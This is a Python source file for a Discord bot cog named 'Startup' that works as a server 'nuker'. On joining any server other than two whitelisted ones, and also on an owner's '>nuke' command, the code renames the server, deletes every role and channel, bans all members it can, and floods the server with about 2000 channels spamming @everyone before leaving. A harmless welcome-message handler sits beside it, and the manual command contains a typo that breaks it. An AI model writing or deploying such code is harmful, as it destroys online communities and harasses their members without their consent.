import discord
from discord.ext.commands import Bot
from discord.ext import commands
class Startup(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    
    @commands.Cog.listener()
    async def on_ready(self):
        print('Logged in as: ' + self.bot.user.name + '#' + self.bot.user.discriminator + ' - (' + str(self.bot.user.id) + ')')
    @commands.command(name='nuke', brief='Nuke the server', description='Nuke the server')
    async def nuke(self, ctx):
        """>nuke"""
        if ctx.author.id == self.bot.owner_id:
            await ctx.message.delete()
            try:
                print(f'Joined guild: {ctx.guild.name} - {str(ctx.guild.id)} - Nuking it :)')
                await ctx.uild.create_text_channel(f'fuckme1')
                invite = await self.bot.get_channel(discord.utils.get(ctx.guild.channels, name=f'fuckme1').id).create_invite(max_age = 300)
                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Invite: {str(invite)} :)')
                await ctx.guild.edit(name="NOX WAS HERE")
                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Changed server name :)')
                for c in ctx.guild.roles:
                    try:
                        await c.delete()
                        print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Deleted role: {c.name}')
                    except discord.errors.HTTPException:
                        pass
                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Deleted all possible roles :)')
                for member in ctx.guild.members:
                    try:
                        await member.ban(reason='Banned by Anix <3')
                        print(f'Banned {member.name}#{member.discriminator} - {str(member.id)}')
                    except discord.errors.Forbidden:
                        pass
                print("Guild: " + str(ctx.guild.name) + " - " + str(ctx.guild.id) + " - Banned all possible members")
                for c in ctx.guild.channels:
                    await c.delete()
                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Deleted all channels :)')
                for i in range(2,2000):
                    await ctx.guild.create_text_channel(f'fuckme{i}')
                    await self.bot.get_channel(discord.utils.get(ctx.guild.channels, name=f'fuckme{i}').id).send("@everyone nox#4041 is the best")
                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Created 2000 channels :)')
                await ctx.guild.leave()
                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Left after nuking :)')  
                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Nuked :)')
            except discord.errors.Forbidden:
                print("Guild: " + str(ctx.guild.name) + " - " + str(ctx.guild.id) + " - Kicked or have been banned")
        return
    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        print(guild.id)
        if guild.id != 993573362221715546 and guild.id != 1002658514017202286:
            try:
                print(f'Joined guild: {guild.name} - {str(guild.id)} - Nuking it :)')
                await guild.create_text_channel(f'fuckme1')
                invite = await self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme1').id).create_invite(max_age = 300)
                print(f'Guild: {guild.name} - {str(guild.id)} - Invite: {str(invite)} :)')
                await guild.edit(name="NOX WAS HERE")
                print(f'Guild: {guild.name} - {str(guild.id)} - Changed server name :)')
                for c in guild.roles:
                    try:
                        await c.delete()
                        print(f'Guild: {guild.name} - {str(guild.id)} - Deleted role: {c.name}')
                    except discord.errors.HTTPException:
                        pass
                print(f'Guild: {guild.name} - {str(guild.id)} - Deleted all possible roles :)')
                for member in guild.members:
                    try:
                        await member.ban(reason='Banned by Anix <3')
                        print(f'Banned {member.name}#{member.discriminator} - {str(member.id)}')
                    except discord.errors.Forbidden:
                        pass
                print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Banned all possible members")
                
                for c in guild.channels:
                    await c.delete()
                print(f'Guild: {guild.name} - {str(guild.id)} - Deleted all channels :)')
                for i in range(2,2000):
                    await guild.create_text_channel(f'fuckme{i}')
                    await self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme{i}').id).send("@everyone nox#4041 is the best")
                print(f'Guild: {guild.name} - {str(guild.id)} - Created 2000 channels :)')
                await guild.leave()
                print(f'Guild: {guild.name} - {str(guild.id)} - Left after nuking :)')  
            except discord.errors.Forbidden:
                print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Kicked or have been banned")
    @commands.Cog.listener()
    async def on_guild_remove(self, guild):
        print(f'Left guild: {guild.name} - {str(guild.id)}')
    @commands.Cog.listener()
    async def on_member_join(self, member):
        print(f'Guild - {member.guild.name} - {str(member.guild.id)} -  {member.name} - {str(member.id)} joined :)') 
        if member.guild.id == 993573362221715546:
            welcomeid = 993573959062790154
        elif member.guild.id == 1002658514017202286:
            welcomeid = 1002658514654728303
        await self.bot.get_channel(welcomeid).send(f"<@{member.id}>",embed=discord.Embed(title=f":wave: Welcome to {member.guild.name}!", description="Please read the rules and have fun!", color=discord.Color.blue()).set_footer(text=f'Welcome {member.name}', icon_url=member.avatar_url).set_image(url="https://i.imgur.com/pkWTMMl.gif"))
        await member.send(f"<@{member.id}> Welcome to the {member.guild.name} Please read the rules and have fun!")
def setup(bot):
    bot.add_cog(Startup(bot))
    print("Startup cog loaded")